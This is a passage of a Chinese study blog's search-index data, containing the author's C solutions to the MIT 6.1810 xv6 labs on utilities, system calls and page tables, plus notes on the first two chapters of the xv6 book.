((p-\u003eusc = (struct usyscall *)kalloc()) == 0) { freeproc(p); release(\u0026p-\u003elock); return 0; } p-\u003eusc-\u003epid = p-\u003epid; 记得还得在freeproc中加上对应的free处理： if(p-\u003eusc) kfree((void*)p-\u003eusc); 在proc_pagetable函数中添加分配USYSCALL页的处理逻辑。 if (mappages(pagetable, USYSCALL, PGSIZE, (uint64)p-\u003eusc, PTE_R | PTE_U) \u003c 0){ uvmunmap(pagetable, TRAMPOLINE, 1, 0); uvmunmap(pagetable, TRAPFRAME, 1, 0); uvmfree(pagetable, 0); return 0; } 在proc_freepagetable也加上对应的处理逻辑： uvmunmap(pagetable, USYSCALL, 1, 0); 这些照着前面抄就完了（） ","date":"2023-03-16","objectID":"/posts/mit_61810_lab3/:1:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: page tables","uri":"/posts/mit_61810_lab3/"},{"categories":["刷课_Lab"],"content":"Print a page table (easy) Define a function called vmprint(). It should take a pagetable_t argument, and print that pagetable in the format described below. Insert if(p-\u003epid==1) vmprint(p-\u003epagetable) in exec.c just before the return argc, to print the first process’s page table. You receive full credit for this part of the lab if you pass the pte printout test of make grade. void vmprint_core(pagetable_t pagetable, int depth) { for(int i = 0; i \u003c 512; i++) { pte_t pte = pagetable[i]; if ((pte \u0026 PTE_V)) { for (int n = 1; n \u003c= depth; n++) printf(\" ..\"); printf(\"%d: pte %p pa %p\\n\", i, pte, PTE2PA(pte)); if (depth != 3) { uint64 child = PTE2PA(pte); vmprint_core((pagetable_t)child, depth + 1); } } } } // print detail of pagetable. void vmprint(pagetable_t pagetable) { printf(\"page table %p\\n\", pagetable); vmprint_core(pagetable, 1); } ","date":"2023-03-16","objectID":"/posts/mit_61810_lab3/:2:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: page tables","uri":"/posts/mit_61810_lab3/"},{"categories":["刷课_Lab"],"content":"Detect which pages have been accessed (hard) Your job is to implement pgaccess(), a system call that reports which pages have been accessed. The system call takes three arguments. First, it takes the starting virtual address of the first user page to check. Second, it takes the number of pages to check. Finally, it takes a user address to a buffer to store the results into a bitmask (a datastructure that uses one bit per page and where the first page corresponds to the least significant bit). You will receive full credit for this part of the lab if the pgaccess test case passes when running pgtbltest. 和 lab2 不一样，这次的虽然需要实现一个系统调用，但是写 syscall 的那些准备工作（比如在user/user.h、user/usys.pl等文件写好syscall的信息）已经被写好了。 通过查看riscv-privileged文档的图4.18得知，PTE_A应该被设置为(1L « 6)。 #define PTE_A (1L \u003c\u003c 6) // accessed 之后在kernel/sysproc.c中修改sys_pgaccess函数的内容： int sys_pgaccess(void) { // lab pgtbl: your code here. int pnum; uint64 addr; uint64 va; int pgmask = 0; struct proc *p = myproc(); argaddr(0, \u0026va); argint(1, \u0026pnum); argaddr(2, \u0026addr); if(pnum \u003e 32) return -1; for(int i = 0; i \u003c pnum; i++) { pte_t *pte = walk(p-\u003epagetable, va, 0); if(*pte \u0026 PTE_A) { *pte \u0026= ~PTE_A; pgmask |= (1 \u003c\u003c i); } va += PGSIZE; } if(copyout(p-\u003epagetable, addr, (char*)\u0026pgmask, sizeof(pgmask)) == -1){ return -1; } return 0; }","date":"2023-03-16","objectID":"/posts/mit_61810_lab3/:3:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: page tables","uri":"/posts/mit_61810_lab3/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第二个 lab 的 solution","date":"2023-03-06","objectID":"/posts/mit_61810_lab2/","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: system calls","uri":"/posts/mit_61810_lab2/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第二个 lab 的 solution system calls ","date":"2023-03-06","objectID":"/posts/mit_61810_lab2/:0:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: system calls","uri":"/posts/mit_61810_lab2/"},{"categories":["刷课_Lab"],"content":"System call tracing (moderate) In this assignment you will add a system call tracing feature that may help you when debugging later labs. You’ll create a new trace system call that will control tracing. It should take one argument, an integer “mask”, whose bits specify which system calls to trace. For example, to trace the fork system call, a program calls trace(1 « SYS_fork), where SYS_fork is a syscall number from kernel/syscall.h. You have to modify the xv6 kernel to print out a line when each system call is about to return, if the system call’s number is set in the mask. The line should contain the process id, the name of the system call and the return value; you don’t need to print the system call arguments. The trace system call should enable tracing for the process that calls it and any children that it subsequently forks, but should not affect other processes. 在Makefile中添加$U/_trace\\，在user/usys.pl添加entry(“trace”)作为stub，在user/user.h写上系统调用的函数prototypeint trace(int);，在kernrl/syscall.h上添加#define SYS_trace 22这个系统调用的宏定义。 这里可以看出，这里的usys.pl和user.h是用来指明trace这个系统调用，以及它的函数prototype是什么，usys.pl用于生成usys.S这个文件，这个文件包含一切调用系统调用的RISC-V汇编代码。 fork: li a7, SYS_fork ecall ret 并不是系统调用具体的汇编代码实现，那样的文件应该在kernel文件夹内产生。这是一个一个ecall跳转。syscall.h就是一个系统调用的宏定义文件， 这里的SYS_fork就是那个文件里的一个宏，所以要想先编译通过，而不考虑trace的具体实现，这个宏得加上。 在kernel/sysproc.c中添加sys_trace()函数，这里的函数用于把要传递给系统调用的参数进行一步处理。 uint64 sys_trace(void) { struct proc *p = myproc(); int MASk; argint(0, \u0026MASk); p-\u003eMASK = MASk; return 0; } 本来一开始我是void，return也是直接return没有return 0。但是这样无返回值的话不能过trace all的测试。 在kernel/proc.h文件中在proc结构体中添加一个变量MASK,用来将trace得到的MASK传递给其子进程。 在kernel/proc.c中找到fork系统调用的实现部分，可以看到在前面的代码是用来将父进程的内存复制给子进程，在中间加上一句： np-\u003eMASK = p-\u003eMASK; 在kernel/syscall.c文件中添加一个用于存储系统调用名称的字符串数组。 static char* syslist[] = { \"fork\", \"exit\", \"wait\", \"pipe\", \"read\", \"kill\", \"exec\", \"fstat\", \"chdir\", \"dup\", \"getpid\", \"sbrk\", \"sleep\", \"uptime\", \"open\", \"write\", \"mknod\", \"unlink\", \"link\", \"mkdir\", \"close\", \"trace\", }; 在同文件的syscall函数中系统调用真正执行的那部分后面添加： if((1 \u003c\u003c num) \u0026 p-\u003eMASK){ printf(\"%d: syscall %s -\u003e %d\\n\", p-\u003epid, syslist[num-1], p-\u003etrapframe-\u003ea0); } lab评测： $ ./grade-lab-syscall trace make: 'kernel/kernel' is up to date. == Test trace 32 grep == trace 32 grep: OK (0.9s) == Test trace all grep == trace all grep: OK (1.0s) (Old xv6.out.trace_all_grep failure log removed) == Test trace nothing == trace nothing: OK (1.0s) == Test trace children == trace children: OK (9.2s) ","date":"2023-03-06","objectID":"/posts/mit_61810_lab2/:1:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: system calls","uri":"/posts/mit_61810_lab2/"},{"categories":["刷课_Lab"],"content":"Sysinfo (moderate) In this assignment you will add a system call, sysinfo, that collects information about the running system. The system call takes one argument: a pointer to a struct sysinfo (see kernel/sysinfo.h). The kernel should fill out the fields of this struct: the freemem field should be set to the number of bytes of free memory, and the nproc field should be set to the number of processes whose state is not UNUSED. We provide a test program sysinfotest; you pass this assignment if it prints “sysinfotest: OK”. 在Makefile中添加$U/_sysinfotest，还是按照之前的步骤把syscall编译所需要的那些文件都修改好。不过user/user.h文件需要添加的是： struct sysinfo; int sysinfo(struct sysinfo *); kernel/kalloc.c文件新增一个函数： uint64 memcol(void){ struct run *r; uint64 col = 0; acquire(\u0026kmem.lock); r = kmem.freelist; while(r) { r = r-\u003enext; col++; } release(\u0026kmem.lock); return col * PGSIZE; } 这个函数中使用的kmem和run结构体都是什么，可以在同文件的其他函数中大抵发现其含义。比如看看那个kalloc函数 kernel/proc.c文件新增一个函数： uint64 pnumcol(void){ struct proc *p; uint64 col = 0; for(p = proc; p \u003c \u0026proc[NPROC]; p++) { acquire(\u0026p-\u003elock); if(p-\u003estate != UNUSED) col++; release(\u0026p-\u003elock); } return col; } kernel/defs.h文件需要加上那两个函数的声明。 kernel/sysproc.c文件新增一个函数： uint64 sys_sysinfo(void){ struct sysinfo si; uint64 addr; argaddr(0, \u0026addr); si.nproc = pnumcol(); si.freemem = memcol(); if(copyout(myproc()-\u003epagetable, addr, (char *)\u0026si, sizeof(si)) \u003c 0) return -1; return 0; } lab评测： $ ./grade-lab-syscall sysinfotest make: 'kernel/kernel' is up to date. == Test sysinfotest == sysinfotest: OK (1.5s)","date":"2023-03-06","objectID":"/posts/mit_61810_lab2/:2:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: system calls","uri":"/posts/mit_61810_lab2/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第二章节","date":"2023-03-06","objectID":"/posts/xv6_book_chapter_2/","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system organization","uri":"/posts/xv6_book_chapter_2/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第二章节 Operating system organization 操作系统的关键在于能够同时支持多个活动、在进程之间共享计算机资源以及隔离进程，也就是多路复用、隔离和交互。 Xx6 运行在多核的 RISC-V 微处理器上，有很多针对 RISC-V 的基地功能。Xv6 是用 “LP64\"C (long 和指针是 64 位，int 是 32 位)编写的。 Xv6 是为 qemu 的 -machine virt 选项模拟支持的硬件编写的。 ","date":"2023-03-06","objectID":"/posts/xv6_book_chapter_2/:0:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system organization","uri":"/posts/xv6_book_chapter_2/"},{"categories":["刷课笔记"],"content":"硬件的抽象 有一种操作系统的实现方式是：将第一节介绍的系统调用实现成一个库，应用程序与之链接。这种情况下，硬件设备信任应用程序，这不符合现在的安全需要。 为了实现隔离，就需要禁止应用程序直接访问敏感的硬件资源，而是将资源抽象为服务。比如程序使用 open、write 等系统调用而不是直接访问磁盘。这为程序提供了方便，并允许操作系统作为接口的实现者管理磁盘。 ","date":"2023-03-06","objectID":"/posts/xv6_book_chapter_2/:1:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system organization","uri":"/posts/xv6_book_chapter_2/"},{"categories":["刷课笔记"],"content":"user、supervisor 和 system call 隔离还需要应用程序和操作系统之间划一道线。如果程序出错，不能导致其他程序甚至操作系统出错，操作系统应该清理失败的程序并继续运行其他的程序。程序之间也应该有一道线以保证数据不会被修改。 CPU 为隔离提供硬件支持。例如 RISC-V 有三种 CPU 执行指令的模式：machine、supervisor 和 user。Machine 代表完全的权限。CPU 在机器模式下启动，这个模式主要用来配置计算机。Xv6 会在 machine 模式执行几行代码后切换到 supervisor 模式。 supervisor 模式允许 CPU 执行的特权指令：启动或禁用中断、读写保存页表地址的寄存器，等等。CPU 不会在 user 模式下执行特权指令，它会切换到supervisor 模式以便于让 supervisor 模式的代码可以终止程序。程序只能在用户空间执行 user 模式能执行的指令。在 supervisor 模式的软件可以在内核空间执行的指令比前者多一些特权指令。运行在内核空间的软件成为内核 (kernel)。 应用程序不能直接调用系统调用。CPU 提供了一个指令用于将 CPU 从 user 模式转成 supervisor 模式，并且在内核指定的入口点进入内核（RISC-V提供的指令是 ecall）。CPU 切换到 supervisor 模式后，内核就可以验证系统调用的参数（例如检查传递给系统调用的地址是否是应用程序内存的一部分），决定是否允许应用程序执行请求的操作并拒绝或执行（比如是否允许写入制定的文件）。内核控制转换到 supervisor 模式的入口点很重要。如果应用程序可以决定内核入口点，就可以跳过一些验证步骤。 ","date":"2023-03-06","objectID":"/posts/xv6_book_chapter_2/:2:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system organization","uri":"/posts/xv6_book_chapter_2/"},{"categories":["刷课笔记"],"content":"内核架构 操作系统的哪部分需要在 supervisor 模式下运行是一个关键问题。一种方法是让整个操作系统在内核中，所有的系统调用的实现都在 supervisor 模式下运行，这叫做宏内核。这种架构的优点在于，操作系统拿到了全部的硬件，操作系统的不同部分之间更容易协作；缺点在于操作系统不同部分之间的接口通常很复杂，更加容易出错（在 supervisor 模式下的错误经常导致内核出错从而导致计算机停止工作）。 为了减少内核出错的风险，操作系统设计人员可以尽量减少操作系统在 supervisor 模式下运行的代码，操作系统大部分处于 user 模式下。这种叫做微内核。 在微内核中，内核接口由几个底层函数组成，用于启动程序、发送信息和访问设备硬件等。这种架构使得内核也变得简单。 现实世界中，宏内核和微内核都很流行。许多 Unix 的内核都是宏内核（例如 Linux，尽管它有一些操作系统功能作为 user 模式下运行）。如 Minix、L4 和 QNX 操作系统都才需微内核架构并在嵌入式设备得到了广泛的应用。L4 的衍生 seL4 非常小，并且验证了它的内存安全性和其他安全属性。 Xv6 和大多数类 Unix 系统使用宏内核，因此 xv6 内核接口对应操作系统接口，内核实现了完整的操作系统。 ","date":"2023-03-06","objectID":"/posts/xv6_book_chapter_2/:3:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system organization","uri":"/posts/xv6_book_chapter_2/"},{"categories":["刷课笔记"],"content":"xv6 架构 Xv6 内核源码在 kernel 目录下，内部函数接口定义在 kernel/defs.h 下 文件 描述 bio.c 文件系统的磁盘缓存 console.c 连接到用户的键盘和屏幕 entry.S 第一个启动指令 exec.c exec() 系统调用 file.c 文件描述符 fs.c 文件系统 kalloc.c 物理页分配 kernelvec.S 处理内核 trap 和时钟中断 log.c 文件系统日志记录和崩溃恢复 main.c 引导时控制其他模块的初始化 pipe.c 管道 plic.c RISC-V 中断控制器 printf.c 向 console 格式化输出 proc.c 进程和调度 sleeplock.c 已有的 CPU 锁 spinlock.c 未有的 CPU 锁 start.c machine 模式的引导代码 string.c C 字符串和字节数组库 swtch.S 线程切换 syscall.c 向处理函数发送系统调用 sysfile.c 文件相关的系统调用 sysproc.c 线程相关的系统调用 trampoline.S 用户和内核之间的切换 trap.c 处理并返回来自 trap 和中断的 C 代码 uart.c 串行端口控制台设备驱动程序 virtio_disk.c 磁盘设备驱动程序 vm.c 管理页表和地址空间 ","date":"2023-03-06","objectID":"/posts/xv6_book_chapter_2/:4:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system organization","uri":"/posts/xv6_book_chapter_2/"},{"categories":["刷课笔记"],"content":"进程概述 进程抽象可以防止一个进程破坏或监视另一个进程的内存、CPU、文件描述符等。它还可以防止进程破坏内核本身。内核实现进程的机制包括 user/supervisor模式、地址空间和线程的时间切片。 为了实现这种隔离，进程抽象给程序提供了一种假象——它独占机器。Xv6 使用页表（由硬件实现）给了每个进程自己的地址空间。RISC-V 将页表映射到物理地址。 Xv6 为每个进程维护了一个单独的页表用于定义进程的地址空间。进程地址空间包括在虚拟地址0开始的用户内存。首先是指令，然后是全局变量，然后是栈，最后是堆。有很多因素限制了进程地址空间的大小：RISC-V 指针是 64 位；在页表中查找虚拟地址时，硬件只使用低 39 位，而 xv6 只使用 39 位中的 38 位。因此最大的地址 MAXVA 被定义在 kerl/riscv.h 中，值是 $2^{38} - 1 =$ 0x33fffffffff。在地址空间的顶部，xv6 为 trampoline 留了一页，以及映射进程 trapframe 的页。Xv6 使用这两个页转换到内核并返回。Trampoline 页包含进出内核的代码，映射 trapframe 是保存和回护用户进程状态所必需的。 Xv6 内核为进程维护多个状态片段，它将这些片段收集在 proc 结构体中。使用 p-\u003exxx 可以引用 proc 结构的元素，比如 p-\u003epagetable 就是指向进程页表的指针。 每个进程都有一个线程去执行进程的指令。为了实现进程之间的切换，内核挂起当前正在运行的线程并恢复另一个进程的线程。线程的大部分状态（局部变量、函数调用返回地址）都存储在线程的栈上。每个进程都有两个栈：一个用户栈和一个内核栈（p-\u003ekstack）。当进程执行用户命令时，只有用户栈被使用，内核栈是空的。当进程进入内核（系统调用或中断）时，内核代码在进程的内核栈上执行，用户栈仍保存的数据但不会被主动调用。线程在主动使用用户栈和内核栈之间交替。内核栈是独立并受到保护，因此即便进程破坏了它的用户栈内核也可以运行。 进程可以通过执行 RISC-V 的 ecall 指令执行系统调用。这个指令提高硬件权限级别并将程序计数器改成内核定义的入口点。入口点的代码切换到内核栈执行实现系统调用的内核指令。系统调用完成时，内核切换到用户栈，并通过 sert 指令返回到用户空间，这将降低硬件特权级别，并在系统调用指令之后继续执行用户指令。 进程可以 block 以等待 I/O 完事。p-\u003estate 指明是否分配进程、准备运行、运行中、等待 I/O 还是退出。p-\u003epagetable 以 RISC-V 预期的格式保存进程的页表。Xv6 使分页硬件执行进程时使用进程的 p-\u003epagetable。进程的页表还用作分配用于存储进程内存的物理页的地址的记录。 ","date":"2023-03-06","objectID":"/posts/xv6_book_chapter_2/:5:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system organization","uri":"/posts/xv6_book_chapter_2/"},{"categories":["刷课笔记"],"content":"启动 xv6，第一个进程和系统调用 当 RISC-V 计算机启动时，它会初始化自己并运行一个运行在 ROM 中的 boot loader。Boot loader 将 xv6 内核加载到内存里，然后在 machine模式下，CPU 从 _entry(kernel/entry.S) 开始执行 xv6。RISC-V 首先禁用分页硬件，虚拟地址直接映射到物理地址。 Boot loader 会将 xv6 内核加载到物理地址为 0x80000000，不放在 0x0 的原因是 0x80000000 之前的地址存放 I/O 设备。 _entry 的指令设置了栈以便于让 xv6 能够给运行 C 代码。Xv6 在 start.c 中为初始栈 stack0 声明了空间。_entry 的代码加载地址 stack0 + 4096 的栈指针寄存器sp，这是栈顶，因为 RISC-V 的栈向下增长。内核有了栈，_entry 就开始调用 start 的 C 代码（start 函数）。 start 函数执行一些仅在 machine 模式下允许的配置，然后切换到 supervisor 模式。为了进入 supervisor 模式，RISC-V 提供了指令mret。这条指令通常用于从 supervisor 模式干到 machine 模式时返回到之前的模式。start 不会直接从这样的调用返回，而是设置一些东西：在寄存器mstatus将以前的权限设置为 supervisor，通过将 main 的地址写入寄存器 mpec 将返回地址设置为 main，将 0 写入页表寄存器stap禁用 supervisor 模式的虚拟地址转换，把所有的中断和异常委托给 supervisor 模式。 在进入 supervisor 模式之前，start 对时钟芯片编程以产生计时器中断。随着内存管理的出现，start 通过调用 mret 返回到 supervisor 模式。这将导致程序计数器改成 main。 在main初始化几个设备和子系统之后，它调用userinit（kernel/proc.c）创建第一个进程。第一个进程执行用RISC-V汇编写的程序，该程序执行xv6的第一个系统调用。initcode.S（user/initcode.S）将exec系统调用的数字SYS_EXEC加载到寄存器a7中，然后调用ecall重新进入内核。 内核使用寄存器 a7 中的数字来调用所需的系统调用。系统调用表 (kernel/syscall.c) 将 SYS_EXEC 映射到内核调用的 sys_exec。exec 用一个新程序（本例是 /init）替换当前进程的内存和寄存器。 一旦内核执行完了 exec，它就会返回到 /init 进程的用户空间。init(user/init.c) 根据需求创建一个新的 console 文件，然后以文件描述符 0、1和 2 的形式打开它，然后启动一个 shell。 ","date":"2023-03-06","objectID":"/posts/xv6_book_chapter_2/:6:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system organization","uri":"/posts/xv6_book_chapter_2/"},{"categories":["刷课笔记"],"content":"现实状况 大多数操作系统都有进程的概念，并且大多数类似于 xv6 的。现代操作系统支持多线程，允许单个进程使用多个 CPU，这是 xv6 不具备的。 ","date":"2023-03-06","objectID":"/posts/xv6_book_chapter_2/:7:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system organization","uri":"/posts/xv6_book_chapter_2/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第一个 lab 的 solution","date":"2023-03-04","objectID":"/posts/mit_61810_lab1/","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Xv6 and Unix utilities","uri":"/posts/mit_61810_lab1/"},{"categories":["刷课_Lab"],"content":"MIT 6.1810 中第一个 lab 的 solution Xv6 and Unix utilities 第一个lab的所有都是在Makefile中添加要编译的目标，并且在user/目录下新建文件。 ... $U/_rm\\ $U/_sh\\ $U/_stressfs\\ $U/_usertests\\ $U/_grind\\ $U/_wc\\ $U/_zombie\\ $U/_sleep\\ $U/_pingpong\\ $U/_primes\\ $U/_find\\ $U/_xargs\\ ... ","date":"2023-03-04","objectID":"/posts/mit_61810_lab1/:0:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Xv6 and Unix utilities","uri":"/posts/mit_61810_lab1/"},{"categories":["刷课_Lab"],"content":"sleep (easy) Implement the UNIX program sleep for xv6; your sleep should pause for a user-specified number of ticks. A tick is a notion of time defined by the xv6 kernel, namely the time between two interrupts from the timer chip. Your solution should be in the file user/sleep.c. $ make qemu ... init: starting sh $ sleep 10 (nothing happens for a little while) $ #include \"kernel/types.h\" #include \"user/user.h\" int main(int argc, char* argv[]){ if((argc != 2) || !atoi(argv[1])){ fprintf(2, \"sleep: error arguments\\n\"); exit(1); } sleep(atoi(argv[1])); exit(0); } ","date":"2023-03-04","objectID":"/posts/mit_61810_lab1/:1:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Xv6 and Unix utilities","uri":"/posts/mit_61810_lab1/"},{"categories":["刷课_Lab"],"content":"pingpong (easy) Write a program that uses UNIX system calls to ‘’ping-pong’’ a byte between two processes over a pair of pipes, one for each direction. The parent should send a byte to the child; the child should print “: received ping”, where is its process ID, write the byte on the pipe to the parent, and exit; the parent should read the byte from the child, print “: received pong”, and exit. Your solution should be in the file user/pingpong.c. $ make qemu ... init: starting sh $ pingpong 4: received ping 3: received pong $ 这里的pingpong我实现的并不是课程网站这样的，而是类似xv6-book中第一章Exercises描述的那样。 #include \"kernel/types.h\" #include \"user/user.h\" int main(void){ char buf[8]; int p[2]; if(pipe(p)){ fprintf(2, \"pingpong: pipe error\\n\"); exit(1); } if(fork() == 0){ read(p[0], buf, 4); printf(\"%d: received %s\\n\", getpid(), buf); write(p[1], \"pong\", 4); }else{ write(p[1], \"ping\", 4); read(p[0], buf, 4); printf(\"%d: received %s\\n\", getpid(), buf); } wait(0); exit(0); } ","date":"2023-03-04","objectID":"/posts/mit_61810_lab1/:2:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Xv6 and Unix utilities","uri":"/posts/mit_61810_lab1/"},{"categories":["刷课_Lab"],"content":"primes (moderate)/(hard) Write a concurrent version of prime sieve using pipes. This idea is due to Doug McIlroy, inventor of Unix pipes. The picture halfway down this page and the surrounding text explain how to do it. Your solution should be in the file user/primes.c. $ make qemu ... init: starting sh $ primes prime 2 prime 3 prime 5 prime 7 prime 11 prime 13 prime 17 prime 19 prime 23 prime 29 prime 31 $ #include \"kernel/types.h\" #include \"user/user.h\" int main(void){ int p[2]; int buf[1]; int i, n, flag = 0; if(pipe(p)){ fprintf(2,\"primes: pipe error\\n\"); exit(1); } if(fork() == 0){ for(i = 2; i \u003c 36; i++){ fprintf(p[1],\"%c\", i); } exit(0); }else{ close(p[1]); } while(read(p[0], buf, 1)){ n = buf[0]; for(i = 1; i \u003c n; i++) if(!(n % i)) flag++; if(flag == 1) printf(\"prime %d\\n\", n); flag = 0; } exit(0); } ","date":"2023-03-04","objectID":"/posts/mit_61810_lab1/:3:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Xv6 and Unix utilities","uri":"/posts/mit_61810_lab1/"},{"categories":["刷课_Lab"],"content":"find (moderate) Write a simple version of the UNIX find program: find all the files in a directory tree with a specific name. Your solution should be in the file user/find.c. $ make qemu ... init: starting sh $ echo \u003e b $ mkdir a $ echo \u003e a/b $ mkdir a/aa $ echo \u003e a/aa/b $ find . b ./b ./a/b ./a/aa/b $ 这里貌似少整了一个东西，但是懒得看了，能跑就行[doge]。 这里大多借鉴的ls的代码实现 #include \"kernel/types.h\" #include \"kernel/stat.h\" #include \"user/user.h\" #include \"kernel/fs.h\" void find(char *path, char *name); int main(int argc, char* argv[]) { if(argc != 3){ fprintf(2, \"find: error arguments\\n\"); exit(-1); } char *path = argv[1]; char *name = argv[2]; find(path, name); exit(0); } void find(char *path, char *name){ char buf[512], *p, *bufcln; int fd; struct stat st; struct dirent de; if((fd = open(path, 0)) \u003c 0){ fprintf(2, \"find: cannot open %s\\n\", path); exit(1); } if(fstat(fd, \u0026st) \u003c 0){ fprintf(2, \"find: cannot stat %s\\n\", path); close(fd); exit(1); } if(st.type == 1){ strcpy(buf, path); p = buf+strlen(buf); *p++ = '/'; while(read(fd, \u0026de, sizeof(de)) == sizeof(de)) { if(de.inum == 0) continue; memmove(p, de.name, DIRSIZ); p[DIRSIZ] = 0; if(stat(buf, \u0026st) \u003c 0){ printf(\"find: cannot stat %s\\n\", buf); continue; } switch(st.type){ case T_FILE: if(!strcmp(name, de.name)) printf(\"%s\\n\", buf); break; case T_DIR: if( !(strcmp(de.name, \".\") \u0026\u0026 strcmp(de.name, \"..\")) ) continue; find(buf, name); break; default: break; } for( bufcln = buf + strlen(buf); bufcln \u003e= buf \u0026\u0026 *bufcln != '/'; bufcln-- ); } } } ","date":"2023-03-04","objectID":"/posts/mit_61810_lab1/:4:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Xv6 and Unix utilities","uri":"/posts/mit_61810_lab1/"},{"categories":["刷课_Lab"],"content":"xargs (moderate) Write a simple version of the UNIX xargs program: its arguments describe a command to run, it reads lines from the standard input, and it runs the command for each line, appending the line to the command’s arguments. Your solution should be in the file user/xargs.c. $ echo hello too | xargs echo bye bye hello too $ #include \"kernel/types.h\" #include \"user/user.h\" #include \"kernel/param.h\" int main(int argc, char* argv[]) { char *au[MAXARG]; char argu[MAXARG][64]; char tmp; int i = 0, flag = 1; for(i = 2; i \u003c argc \u0026\u0026 flag \u003c MAXARG; i++){ memcpy(argu[flag], argv[i], strlen(argv[i])); flag++; } i = 0; while(read(0,\u0026tmp,1)){ switch (tmp){ case ' ': case '\\n': flag++; i = 0; continue; default: break; } if(i \u003c 64) argu[flag][i] = tmp; else{ fprintf(2,\"xargs: long argument\\n\"); exit(1); } i++; } for(i = 0; i \u003c= flag; i++) au[i] = argu[i]; if(fork() == 0){ exec(argv[1], au); fprintf(2,\"xargs: exec failed\\n\"); exit(1); } wait(0); exit(0); }","date":"2023-03-04","objectID":"/posts/mit_61810_lab1/:5:0","tags":["Xv6_RISC-V"],"title":"MIT 6.1810: Xv6 and Unix utilities","uri":"/posts/mit_61810_lab1/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第一章节","date":"2023-03-04","objectID":"/posts/xv6_book_chapter_1/","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system interfaces","uri":"/posts/xv6_book_chapter_1/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第一章节 Operating system interfaces 每个运行的程序叫做进程，它们在内存都包含指令、数据和栈。指令实现了程序的运算，数据是运算所依赖的变量，栈体现了程序的过程调用。一个计算机通常有很多进程，但只有一个内核。 当程序需要调用内核服务时会调用一个 system call（调用操作系统的接口）。System call 会进入内核，内核执行服务并返回。进程可以在用户空间和内核空间间交替执行。 操作系统内核使用 CPU 提供的硬件保护机制确保每个进程执行时只能访问自己的内存。内核需要在硬件特权下执行以实现这些保护，用户程序不具备这些特权。当用户程序调用一个 system call 时，硬件提升权限级别并且开始执行内核中准备好的函数。 内核提供的系统调用集合是用户程序看到的接口。xv6 提供了 Unix 内核传统上提供的服务和 system call 的子集。 ","date":"2023-03-04","objectID":"/posts/xv6_book_chapter_1/:0:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Operating system interfaces","uri":"/posts/xv6_book_chapter_1/"},{"categories":["刷课笔记"],"content":"进程和内存 一个xv6的进程由用户空间内存（代码、数据和栈）和内核私有的进程状态组成。Xv6 分时进程：它将等待执行的进程集中切换到可用的 CPU。Xv6 会在进程没有执行时保存该进程的 CPU 寄存器，并在下次运行该进程时恢复它们。 一个进程使用 fork 系统调用创建。fork 为新进程提供了一份调用者进程内存（指令和数据）的副本。fork 在新进程和原来的进程都有返回值，在原来的进程中返回新进程的PID，新进程返回0。原来的进程和新进程通常被成为父进程和子进程。 系统调用 描述 int fork() 创建一个进程，返回子进程的 PID int exit(int status) 终止当前进程，status 给 wait()，没有返回 int wait(int *status) 等待子进程退出，退出状态在 *status，返回子进程 PID int kill(int pid) 终止PID所指的进程，返回 0 或 -1（如果出错了的话） int sleep(int n) 暂停 n 个时钟周期 int exec(char *file, char *argv[]) 加载文件和参数并执行，出错的话有返回值 char *sbrk(int n) 将进程的内存增加 n 个字节，返回新内存的位置 int open(char *file, int flags) 打开一个文件，flags 表示读写操作，返回文件描述符 int write(int fd, char *buf, int n) 将 n 个字节从 buf 写入文件描述符 fd，返回 n int read(int fd, char *buf, int n) 读 n 个字节到 buf，返回读取的数目或 0（文件结尾） int close(int fd) 释放打开的文件描述符 int dup(int fd) 返回和原文件描述符所指一样的一个新的文件描述符 int pipe(int p[]) 创建一个管道，将读写文件描述符放在 p[0] 和 p[1] 上 int chdir(char *dir) 更改当前目录 int mkdir(char *dir) 创建新目录 int mknod(char *file, int, int) 创建设备文件 int fstat(int fd, struct stat *st) 将关于一个打开的文件的信息放入 *st int stat(char *file, struct stat *st) 将关于命名文件的信息放入 *st int link(char *file1, char *file2) 为文件 file1 创建别名 file2 int unlink(char *file) 删除文件 exit 系统调用导致调用进程停止执行并释放资源（比如内存和打开的文件）。它使用一个整型变量 status 作为参数，通常 0 代表成功，1 代表失败。 wait 系统调用返回本进程的已退出的子进程的 PID，并将子进程的退出状态复制传递给 wait 的地址。如果调用者的子进程一个都没退出，wait就等。如果调用者没有子进程，wait 会返回 -1。如果父进程不关心子进程的状态，它可以传递一个0地址给wait。 exec 系统调用以存储在文件系统的文件为新的内存映像替换调用者的内存。这个文件有格式要求，xv6 使用 ELF 格式。exec 成功调用的话不会返回到调用程序。exec 接受两个参数：包含可执行文件的文件名和字符串参数数组。 Xv6 的 shell 程序就是用了以上三个系统调用实现了执行程序。shell 从用户读取一行输入，然后调用 fork 创建 shell 进程的副本。父进程调用 wait，子进程调用 exec() 运行命令。当子进程 exit 后，父进程的 wait 也就有了结果。 // Read and run input commands. while(getcmd(buf, sizeof(buf)) \u003e= 0){ if(buf[0] == 'c' \u0026\u0026 buf[1] == 'd' \u0026\u0026 buf[2] == ' '){ // Chdir must be called by the 